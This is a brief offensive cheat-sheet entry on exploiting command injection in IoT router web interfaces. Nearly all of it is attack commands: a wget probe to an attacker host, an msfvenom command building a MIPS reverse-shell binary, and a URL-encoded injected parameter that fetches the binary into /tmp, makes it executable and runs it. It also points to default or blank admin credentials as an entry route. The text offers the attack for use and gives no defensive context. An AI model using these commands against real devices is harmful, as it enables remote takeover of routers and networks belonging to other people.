# IoT Router Command Injection (MIPS Payload)

Many embedded router web UIs have unsanitized vendor CGI endpoints and default/blank admin credentials. Standard reverse-shell payloads need the right CPU architecture — check the device's chipset (MIPS big/little-endian is common).

```bash
# confirm injection: fetch a benign resource first
<vulnerable-param>=wget+http://<LHOST>/

# build an architecture-matched payload
msfvenom -p linux/mipsbe/shell/reverse_tcp -a mipsbe LHOST=<LHOST> LPORT=<LPORT> -o rev -f elf

# injected param (URL-encoded) to fetch, chmod, and run it
<vulnerable-param>=wget+http%3a//<LHOST>/rev+-O+/tmp/rev%3b+chmod+755+/tmp/rev%3b+/tmp/rev
```
